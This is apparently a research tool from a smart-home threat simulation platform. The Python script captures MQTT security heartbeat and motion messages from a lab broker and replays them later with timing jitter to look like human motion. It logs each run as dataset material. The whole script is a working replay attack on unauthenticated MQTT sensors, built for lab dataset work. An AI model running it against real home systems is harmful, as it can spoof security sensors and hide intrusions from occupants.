import sys
import os
import paho.mqtt.client as mqtt
import json
import time
import argparse
import random

# Ensure the project root is in the path for forensic_utils
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from forensic_utils import DualLogger, get_timestamp, get_iso_now

# Standardized Research Banners
BANNER = """
==================================================
  SOVEREIGNTY RESEARCH: TIME-SHIFTED REPLAY TOOL
==================================================
"""

# Configuration for standardized logging
BASE_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset"
LOG_DIR = os.path.join(BASE_DIR, "logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")

BROKER = "192.168.1.105"
PORT = 1883
TOPICS = ["shtsp/home/security/heartbeat", "shtsp/home/security/motion"]

class AdvancedReplaySimulator:
    def __init__(self, capture_duration, delay):
        self.capture_duration = capture_duration
        self.delay = delay
        self.buffer = []
        self.is_capturing = True
        
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "Research_Replay")
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message

    def on_connect(self, client, userdata, flags, rc):
        print(f"✅ Replay Simulator connected to {BROKER}")
        for topic in TOPICS:
            client.subscribe(topic)
        print(f"🎣 CAPTURING network window for {self.capture_duration}s...")

    def on_message(self, client, userdata, msg):
        if self.is_capturing:
            self.buffer.append({
                "topic": msg.topic,
                "payload": msg.payload.decode('utf-8', errors='ignore'),
                "capture_time": time.time()
            })
            sys.stdout.write(f"\r📦 Captured {len(self.buffer)} packets...")
            sys.stdout.flush()

    def run_replay(self):
        print(f"\n⏳ Capture Finished. Delaying {self.delay}s to simulate historical lapse...")
        time.sleep(self.delay)
        print(f"🚀 INJECTING Replayed Window ({len(self.buffer)} packets)...")
        
        for i, item in enumerate(self.buffer):
            if i > 0:
                interval = item["capture_time"] - self.buffer[i-1]["capture_time"]
                # Research Jitter: Adds timing noise to mimic human motion variance
                jittered_interval = interval * random.uniform(0.9, 1.1)
                time.sleep(jittered_interval)
            
            self.client.publish(item["topic"], item["payload"])
            sys.stdout.write(f"\r⚡ Replaying: {i+1}/{len(self.buffer)}")
            sys.stdout.flush()

        print("\n🏁 Injection Sequence Completed.")
        self.save_session()

    def save_session(self):
        session_ts = get_timestamp()
        
        # Dual Log Session Report
        session_data = {
            "timestamp": session_ts,
            "attack_type": "Replay_Simulation",
            "capture_duration": self.capture_duration,
            "delay_interval": self.delay,
            "packet_count": len(self.buffer)
        }
        json_p, csv_p = DualLogger.log_session(session_data, SESSIONS_DIR, f"replay_session_{session_ts}")
        print(f"📊 Forensic Trace Recorded: {json_p} (+.csv)")

    def run(self):
        try:
            self.client.connect(BROKER, PORT, 60)
            self.client.loop_start()
            
            time.sleep(self.capture_duration)
            self.is_capturing = False
            
            self.run_replay()
            
            self.client.loop_stop()
            self.client.disconnect()
        except KeyboardInterrupt:
            print("\n🛑 Simulation Stopped.")
        except Exception as e:
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Time-Shifted Replay Simulation")
    parser.add_argument("--broker", default="192.168.1.105", help="Target Broker IP")
    parser.add_argument("--capture", type=int, default=30, help="Capture phase (seconds)")
    parser.add_argument("--delay", type=int, default=10, help="Delay phase (seconds)")
    
    args = parser.parse_args()

    simulator = AdvancedReplaySimulator(args.capture, args.delay)
    simulator.run()
